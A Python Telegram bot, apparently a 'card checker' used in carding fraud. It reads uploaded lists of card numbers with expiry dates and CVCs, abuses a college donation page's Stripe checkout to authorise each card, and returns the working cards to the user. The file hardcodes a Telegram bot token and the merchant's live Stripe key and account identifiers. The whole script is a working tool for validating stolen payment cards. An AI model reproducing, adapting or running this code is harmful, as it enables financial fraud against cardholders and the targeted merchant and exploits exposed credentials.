import requests
import json
import time
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "8009942983:AAE_sn8PdZ6ekBis3PMyBpv9Vyo0cP24b_c"

# Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variables to store live results
live_results = {"charged": [], "declined": []}


# ================== CARD CHECKING FUNCTIONS ==================

def create_session():
    """Create a new session with cookies for the entire process"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Not(A:Brand";v="99", "Android WebView";v="133", "Chromium";v="133""',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    })
    return session


def get_payment_intent(session, amount="10"):
    """Get a payment intent ID and client secret from the donation page"""
    donation_url = "https://www.mc.edu/give"
    session.get(donation_url)

    url = "https://go.mc.edu/register/form?cmd=payment"
    headers = {
        "Host": "go.mc.edu",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://go.mc.edu",
        "Referer": "https://go.mc.edu/register/?id=789d4530-51d3-d805-2676-2ca00dbbc45c&amp%3Bamp=&amp%3Bsys%3Afield%3Aonline_giving_department=3cef5b4a-e694-4df1-8ec4-1c94954a5131",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    data = {
        "cmd": "getIntent",
        "amount": amount,
        "payment_type": "card",
        "summary": "Donations",
        "currency": "usd",
        "account": "acct_1KQdE6PmVGzx57IR",
        "setupFutureUsage": "",
        "test": "0",
        "add_fee": "0"
    }
    response = session.post(url, headers=headers, data=data)
    try:
        response_data = json.loads(response.text)
        payment_intent_id = response_data.get('id')
        client_secret = response_data.get('clientSecret')
        if payment_intent_id and client_secret:
            return payment_intent_id, client_secret
        else:
            return None, None
    except Exception as e:
        return None, None


def process_card(session, payment_intent_id, client_secret, card_info):
    """Process a card with the given payment intent and client secret"""
    try:
        card_number, exp_month, exp_year, cvc = card_info
        card_number = card_number.replace(" ", "")
        url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
        headers = {
            "Host": "api.stripe.com",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }
        data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][postal_code]": "10006",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[payment_user_agent]": "stripe.js/a8247d96cc; stripe-js-v3/a8247d96cc; payment-element; deferred-intent",
            "payment_method_data[referrer]": "https://go.mc.edu",
            "payment_method_data[time_on_page]": str(int(time.time() * 1000)),
            "payment_method_data[client_attribution_metadata][client_session_id]": "d67fc2ce-78dc-4f28-8ce1-2a546a6606dd",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
            "payment_method_data[guid]": "NA",
            "payment_method_data[muid]": "NA",
            "payment_method_data[sid]": "NA",
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "client_context[capture_method]": "manual",
            "client_context[payment_method_types][0]": "card",
            "client_context[payment_method_options][us_bank_account][verification_method]": "instant",
            "use_stripe_sdk": "true",
            "key": "pk_live_f1etgxOxEyOS3K9myaBrBqrA",
            "_stripe_account": "acct_1KQdE6PmVGzx57IR",
            "client_secret": client_secret,
        }
        response = session.post(url, headers=headers, data=data)
        response_json = json.loads(response.text)
        if response.status_code == 200:
            if response_json.get('status') == 'requires_capture':
                return True, "Card approved ✅"
            else:
                return False, f"Payment not approved: {response_json.get('status', 'unknown status')}"
        else:
            error = response_json.get('error', {})
            decline_code = error.get('decline_code', 'unknown')
            message = error.get('message', 'Unknown error')
            return False, f"Declined ({decline_code}): {message}"
    except Exception as e:
        return False, f"Error processing card: {str(e)}"


def parse_card_line(line):
    """Parse a line from a text file containing card information"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        parts = line.split('|')
        if len(parts) == 4:
            card_number, exp_month, exp_year, cvc = parts
            if "20" in exp_year:
                exp_year = exp_year.split("20")[1]
            return card_number.strip(), exp_month.strip(), exp_year.strip(), cvc.strip()
        else:
            return None
    except Exception as e:
        return None


# ================== TELEGRAM BOT FUNCTIONS ==================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message and ask for the file."""
    keyboard = [[InlineKeyboardButton("Upload TXT File", callback_data="upload_file")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Welcome to the Card Checker Bot! 🚀\n\n"
        "Please upload a TXT file containing card information.",
        reply_markup=reply_markup,
    )


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the uploaded file."""
    file = await update.message.document.get_file()
    file_path = f"cards_{update.message.from_user.id}.txt"
    await file.download_to_drive(file_path)
    await update.message.reply_text("File received! Starting card checking...")
    await check_cards_from_file(update, context, file_path)


async def check_cards_from_file(update: Update, context: ContextTypes.DEFAULT_TYPE, filename):
    """Check cards from the uploaded file."""
    try:
        with open(filename, "r") as file:
            cards = file.readlines()

        valid_count = 0
        success_count = 0

        for i, line in enumerate(cards):
            session = create_session()
            card_info = parse_card_line(line)
            if not card_info:
                continue

            valid_count += 1
            card_number, exp_month, exp_year, cvc = card_info
            masked_number = card_number[:6] + "******" + card_number[-4:]

            payment_intent_id, client_secret = get_payment_intent(session)
            if not payment_intent_id or not client_secret:
                await update.message.reply_text(f"{masked_number} >> Failed to get payment intent ❌")
                continue

            success, message = process_card(session, payment_intent_id, client_secret, card_info)
            if success:
                live_results["charged"].append(f"{masked_number}|{exp_month}|{exp_year}|{cvc}")
                success_count += 1
                await update.message.reply_text(f"{masked_number} >> {message} ✅")
            else:
                live_results["declined"].append(f"{masked_number}|{exp_month}|{exp_year}|{cvc}")
                await update.message.reply_text(f"{masked_number} >> {message} ❌")

            await update_live_results(update, context)
            time.sleep(1)

        await update.message.reply_text(f"✅ Checked {valid_count} cards, {success_count} charged.")
        if live_results["charged"]:
            with open("charged_cards.txt", "w") as f:
                f.write("\n".join(live_results["charged"]))
            await update.message.reply_document(document=open("charged_cards.txt", "rb"))
        else:
            await update.message.reply_text("No charged cards found. ❌")

    except Exception as e:
        await update.message.reply_text(f"Error checking cards: {str(e)}")


async def update_live_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Update live results."""
    charged_count = len(live_results["charged"])
    declined_count = len(live_results["declined"])
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Live Results:\n✅ Charged: {charged_count}\n❌ Declined: {declined_count}",
    )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "upload_file":
        await query.edit_message_text(
            text="Please upload a TXT file containing card information in this format:\n\n"
                 "CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC\n"
                 "Example: 4111111111111111|01|25|123"
        )


def main():
    """Start the bot."""
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.run_polling()


if __name__ == "__main__":
    main()
